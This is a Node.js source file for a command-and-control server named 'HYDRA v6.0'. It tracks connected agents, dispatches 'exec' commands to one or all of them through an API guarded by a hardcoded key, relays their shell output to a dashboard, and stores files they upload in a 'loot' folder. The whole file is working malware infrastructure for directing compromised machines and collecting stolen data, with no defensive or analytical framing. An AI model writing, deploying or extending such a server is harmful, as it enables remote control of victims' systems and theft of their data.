// NK HYDRA C2 SERVER v6.0 (REAL-TIME SWARM)
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 });

// CONFIG
const PORT = process.env.PORT || 3000;
const NK_API_KEY = "nk-autonomy-secret-key-1533";

app.use(cors());
app.use(express.json());
app.use(express.static('public')); // Serves the Dashboard

// STORAGE
const LOOT_DIR = path.join(__dirname, 'loot');
if (!fs.existsSync(LOOT_DIR)) fs.mkdirSync(LOOT_DIR);

let agents = new Map(); // socketId -> AgentData
let uiSockets = new Set(); // Set of UI socket IDs

// Helper to broadcast agent list to all UIs
function broadcastAgentList() {
    const agentList = Array.from(agents.values());
    uiSockets.forEach(uiId => {
        io.to(uiId).emit('agents_list', agentList);
        io.to(uiId).emit('server_status', { 
            online_agents: agentList.length, 
            uptime: process.uptime(),
            status: 'HEALTHY'
        });
    });
}

// --- NK AUTONOMY API ---
app.post('/nk_command_dispatch', (req, res) => {
    const { key, target, cmd, payload } = req.body;
    
    if (key !== NK_API_KEY) return res.status(403).json({ error: "Access Denied" });

    console.log(`[NK-AUTONOMY] Dispatching '${cmd}' to '${target}'`);

    if (target === 'all') {
        io.emit('exec', { cmd, payload });
        return res.json({ status: "Dispatched to ALL", count: agents.size });
    }

    // Find agent by ID (data.id) not socket ID
    const agentEntry = [...agents.entries()].find(([sid, data]) => data.id === target);
    
    if (agentEntry) {
        io.to(agentEntry[0]).emit('exec', { cmd, payload });
        return res.json({ status: "Dispatched", agent: target });
    }

    return res.status(404).json({ error: "Agent not found" });
});

// --- SOCKET HANDLERS ---
io.on('connection', (socket) => {
    socket.on('identify', (data) => {
        if (data.type === 'agent') {
            const agentData = { ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() };
            agents.set(socket.id, agentData);
            console.log('[+] AGENT CONNECTED:', data.id);
            broadcastAgentList();
            
            // Notify UI of new connection event
            io.emit('agent_event', { type: 'SYSTEM', agentId: data.id, payload: 'CONNECTED TO SWARM' });

        } else if (data.type === 'ui') {
            uiSockets.add(socket.id);
            socket.emit('agents_list', Array.from(agents.values()));
            socket.emit('server_status', { 
                online_agents: agents.size, 
                uptime: process.uptime(),
                status: 'HEALTHY'
            });
        }
    });

    socket.on('stream_log', (data) => {
        // Broadcast to UI
        io.emit('agent_event', { type: 'SHELL_OUTPUT', agentId: data.from, payload: data.output });
    });

    socket.on('upload_file', (data) => {
        const filepath = path.join(LOOT_DIR, `${data.agentId}_${Date.now()}_loot.dat`);
        fs.writeFile(filepath, data.data, 'base64', (err) => {
            if(!err) {
                console.log(`[+] LOOT SAVED: ${filepath}`);
                io.emit('agent_event', { type: 'LOOT_SAVED', agentId: data.agentId, payload: filepath });
            } else {
                io.emit('agent_event', { type: 'ERROR', agentId: data.agentId, payload: 'Upload Failed: ' + err.message });
            }
        });
    });

    socket.on('disconnect', () => {
        if (agents.has(socket.id)) {
            const ag = agents.get(socket.id);
            console.log('[-] AGENT LOST:', ag.id);
            agents.delete(socket.id);
            broadcastAgentList();
            io.emit('agent_event', { type: 'SYSTEM', agentId: ag.id, payload: 'DISCONNECTED (TIMEOUT)' });
        }
        if (uiSockets.has(socket.id)) {
            uiSockets.delete(socket.id);
        }
    });
});

server.listen(PORT, () => console.log(`[HYDRA v6.0] Listening on port ${PORT}`));
